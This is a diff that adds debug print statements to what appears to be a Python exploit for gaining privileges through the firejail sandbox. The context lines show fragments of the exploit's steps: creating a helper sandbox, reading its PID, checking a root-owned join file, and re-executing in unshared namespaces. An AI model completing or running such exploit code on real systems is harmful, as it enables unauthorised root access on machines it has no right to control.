@@ -58,6 +58,8 @@ def bindMount(src, dst):
 
 def checkSelfExecutable():
     s = os.stat(__file__)
+    print("checkSelf: ", s)
+    print("checkSelf: ", stat)
 
     if (s.st_mode & stat.S_IXUSR) == 0:
         printe(f"{__file__} needs to have the execute bit set for the exploit to work. Run `chmod +x {__file__}` and try again.")
@@ -73,10 +75,12 @@ def createHelperSandbox():
     proc = subprocess.Popen(
             "firejail --noprofile -- sleep 10d".split(),
             stderr=subprocess.PIPE)
+    print("createHelper: ", proc)
 
     # read out the child PID from the stderr output of firejail
     while True:
         line = proc.stderr.readline()
+        print("createHelper line: ", line)
         if not line:
             raise Exception("helper sandbox creation failed")
 
@@ -124,7 +128,7 @@ def createHelperSandbox():
 
 # Re-executes the current script with unshared user and mount namespaces
 def reexecUnshared(join_file):
-
+    print("inside reexec")
     if not checkFile(join_file):
         printe(f"{join_file}: this file does not match the requirements (owner uid 0, size 1 byte, content '1')")
 
@@ -142,6 +146,7 @@ def reexecUnshared(join_file):
     subprocess.call(cmdline)
 
 if "FIREJOIN_UNSHARED" not in os.environ:
+    print("firejoin unshared")
     # First stage of execution, we first need to fork off a helper sandbox and
     # an exploit environment
     checkSelfExecutable()
